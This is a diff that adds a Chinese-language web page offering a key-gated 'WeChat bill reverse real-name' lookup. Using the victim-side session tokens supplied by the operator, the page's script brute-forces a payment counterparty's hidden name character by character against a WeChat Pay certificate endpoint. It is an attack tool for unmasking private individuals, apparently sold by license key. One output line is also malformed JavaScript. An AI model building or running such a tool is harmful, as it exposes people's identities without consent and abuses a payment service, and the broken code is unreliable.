@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>鱼笙微信账单反查</title>
+<style>
+*{box-sizing:border-box;font-family:Arial}
+body{max-width:400px;margin:30px auto;padding:0 15px;background:#f4f4f4}
+.main{background:#fff;padding:20px;border-radius:12px;box-shadow:0 0 10px #00000010}
+input,select,button{
+width:100%;padding:10px;margin:6px 0;
+border:1px solid #ddd;border-radius:8px;font-size:15px
+}
+button{
+background:#07c160;color:white;border:none;font-weight:bold;
+cursor:pointer
+}
+#result{
+margin-top:12px;padding:10px;border-radius:8px;text-align:center;font-weight:bold
+}
+</style>
+</head>
+<body>
+<div class="main">
+<h3 style="text-align:center;margin-top:0">鱼笙微信账单反实名</h3>
+
+卡密：<input type="text" id="key" placeholder="请输入卡密">
+ek_sid：<input type="text" id="ek_sid">
+uin_session：<input type="text" id="uin_session">
+wxp_log_uid：<input type="text" id="wxp_log_uid">
+
+姓名长度：
+<select id="name_len">
+<option value="2">2字姓名</option>
+<option value="3">3字姓名</option>
+</select>
+
+首字（3字填）：<input type="text" id="first">
+尾字（必填）：<input type="text" id="last">
+
+<button onclick="start()">开始查询</button>
+<div id="result"></div>
+
+<script>
+// ========== 卡密（你自己改这个）==========
+const MY_KEY = "yusheng666";
+
+// ========== 字库 ==========
+const CHAR_POOL = "文子俊泽宇嘉浩晨一熠博睿梓恒毅建家世明永连天川光宗振彦锦智鑫杰凯承启昊伟强海涛有鹏峰斌彬龙昌福林荣辉正利达学祥旭峰少思国新志洪宝兴雨佳思雅美梦欣怡晓雪梓若诗语依涵婉静惠淑芷芸曼灵月琳慕倩安琪丽燕玲萍芳莉娜婷艳梅红珍玉春霞丹萍慧玲巧茹玲燕春丽凤玲子梓嘉晨希宁乐安凡一旭景清沐辰宣然昀书言星文亚新金瑞兆宗令延庆炳洪万长凤秀云桂英德仁义礼智信忠孝昌盛宗祖世传继承光耀荣华宪庆繁祥令德维垂佑钦绍念显扬锡绪同春夏秋冬东南西北天地日月江河湖海二三四五六七八九十百千万";
+
+const URL = "https://payapp.wechatpay.cn/transferbillcertificate/beforefacescan";
+
+async function start(){
+let r = document.getElementById("result");
+r.textContent = "查询中...";
+r.style.color = "#333";
+
+let key = document.getElementById("key").value.trim();
+let ek_sid = document.getElementById("ek_sid").value.trim();
+let uin_session = document.getElementById("uin_session").value.trim();
+let wxp_log_uid = document.getElementById("wxp_log_uid").value.trim();
+let name_len = document.getElementById("name_len").value;
+let first = document.getElementById("first").value.trim();
+let last = document.getElementById("last").value.trim();
+
+if(key !== MY_KEY){
+r.textContent = "❌ 卡密错误";
+r.style.color = "red";
+return;
+}
+
+if(!ek_sid || !uin_session || !wxp_log_uid || !last){
+r.textContent = "❌ 信息不能为空";
+r.style.color = "red";
+return;
+}
+
+let headers = {
+"Content-Type": "application/json;charset=utf-8",
+"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.69 NetType/WIFI Language/zh_CN"
+};
+
+try{
+for(let c of CHAR_POOL){
+let name = name_len == 3 ? (first + c + last) : (c + last);
+
+let res = await fetch(URL, {
+method: "POST",
+headers: headers,
+body: JSON.stringify({ respondent_true_name: name }),
+mode: "cors"
+});
+
+let text = await res.text();
+if(
+text.includes("成功") ||
+text.includes("face") ||
+text.includes("scan") ||
+text.includes("核验")
+){
+r.textContent = "✅ 真实姓名：" + name 若显示次数过多稍后重试会出错;
+r.style.color = "green";
+return;
+}
+
+await new Promise(r=>setTimeout(r,350));
+}
+r.textContent = "❌ 未找到";
+r.style.color = "red";
+}catch(e){
+r.textContent = "❌ 请求失败：" + e.message;
+r.style.color = "red";
+}
+}
+</script>
+</div>
+</body>
+</html>
